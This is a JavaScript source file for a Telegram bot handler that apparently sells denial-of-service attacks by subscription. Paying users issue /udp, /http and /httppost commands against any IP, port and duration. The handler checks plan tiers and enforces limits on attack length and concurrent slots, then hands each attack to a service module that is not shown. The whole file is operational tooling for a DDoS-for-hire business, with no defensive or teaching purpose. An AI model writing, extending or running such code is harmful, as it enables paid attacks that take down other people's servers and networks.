const config = require('../../config/config');
const userService = require('../services/userService');
const attackService = require('../services/attackService');
const { backToMenuKeyboard } = require('../utils/keyboards');

class AttackHandler {
  buildCommandsHelp(plan, telegramId) {
    const lines = config.methods.map((m) => `/${m.command} <ip> <port> <duration>`);

    return `ATTACK COMMANDS
────────────────────
Format: /method ip port duration

${lines.join('\n')}

Examples:
/udp 192.168.1.1 80 60
/http 10.0.0.1 443 120
/httppost 127.0.0.1 8080 30

Your limits:
Duration:   ${plan.isOwner ? 'Unlimited' : `${plan.maxDuration}s max`}
Concurrent: ${plan.isOwner ? 'Unlimited' : `${plan.concurrent} slot${plan.concurrent > 1 ? 's' : ''}`}
Active now: ${attackService.getActiveCount(telegramId)}`;
  }

  sendCommandsHelp(bot, chatId, telegramId) {
    const plan = userService.getActivePlan(telegramId);

    if (!plan) {
      bot.sendMessage(
        chatId,
        `NO ACTIVE PLAN
────────────────────
You need an active subscription to launch attacks.

Go to Plans and complete payment.
The owner must approve your payment before access is granted.`,
        { reply_markup: backToMenuKeyboard() }
      );
      return;
    }

    bot.sendMessage(chatId, this.buildCommandsHelp(plan, telegramId), { reply_markup: backToMenuKeyboard() });
  }

  async handleAttackCommand(bot, msg, match, method) {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;

    userService.registerUser(msg.from);

    const plan = userService.getActivePlan(telegramId);

    if (!plan) {
      bot.sendMessage(
        chatId,
        `ACCESS DENIED
────────────────────
No active plan found.

Purchase a plan and wait for owner approval.`,
        { reply_markup: backToMenuKeyboard() }
      );
      return;
    }

    const target = match[1]?.trim();
    const port = Number(match[2]);
    const duration = Number(match[3]);

    if (!target) {
      bot.sendMessage(
        chatId,
        `INVALID COMMAND
────────────────────
Usage: /${method.command} <ip> <port> <duration>

Example:
/${method.command} 192.168.1.1 80 60`
      );
      return;
    }

    if (!Number.isInteger(port) || port < 1 || port > 65535) {
      bot.sendMessage(chatId, 'Invalid port. Use a number between 1 and 65535.');
      return;
    }

    if (!Number.isInteger(duration) || duration < 1) {
      bot.sendMessage(chatId, 'Invalid duration. Use a positive number in seconds.');
      return;
    }

    if (!plan.isOwner && duration > plan.maxDuration) {
      bot.sendMessage(
        chatId,
        `DURATION LIMIT
────────────────────
Your plan allows max ${plan.maxDuration}s per attack.
You requested ${duration}s.

Upgrade your plan for longer attacks.`
      );
      return;
    }

    if (!attackService.canLaunch(telegramId, plan.concurrent)) {
      bot.sendMessage(
        chatId,
        `CONCURRENT LIMIT
────────────────────
Your plan allows ${plan.concurrent} concurrent slot${plan.concurrent > 1 ? 's' : ''}.
You currently have ${attackService.getActiveCount(telegramId)} active.

Wait for an attack to finish or upgrade your plan.`
      );
      return;
    }

    const statusMsg = await bot.sendMessage(
      chatId,
      `LAUNCHING ATTACK
────────────────────
Target:    ${target}:${port}
Method:    ${method.name}
Duration:  ${duration}s
Status:    Initializing...`
    );

    const result = attackService.launchAttack({
      telegramId,
      username: msg.from.username,
      target,
      port,
      method: method.name,
      duration,
      maxConcurrent: plan.concurrent
    });

    if (result.error === 'concurrent_limit') {
      bot.editMessageText(
        `CONCURRENT LIMIT
────────────────────
All ${result.max} slot${result.max > 1 ? 's are' : ' is'} in use.
Active: ${result.active}`,
        { chat_id: chatId, message_id: statusMsg.message_id }
      );
      return;
    }

    bot.editMessageText(
      `ATTACK RUNNING
────────────────────
Target:    ${target}:${port}
Method:    ${method.name}
Duration:  ${duration}s
Status:    Running
Slots:     ${attackService.getActiveCount(telegramId)}/${plan.isOwner ? 'Unlimited' : plan.concurrent}
────────────────────
Attack logged. Completes in ${duration}s.`,
      { chat_id: chatId, message_id: statusMsg.message_id, reply_markup: backToMenuKeyboard() }
    );

    setTimeout(() => {
      bot.sendMessage(
        chatId,
        `ATTACK COMPLETED
────────────────────
Target:    ${target}:${port}
Method:    ${method.name}
Duration:  ${duration}s
Status:    Finished
Time:      ${new Date().toISOString()}`
      ).catch(() => {});
    }, duration * 1000);
  }
}

module.exports = new AttackHandler();
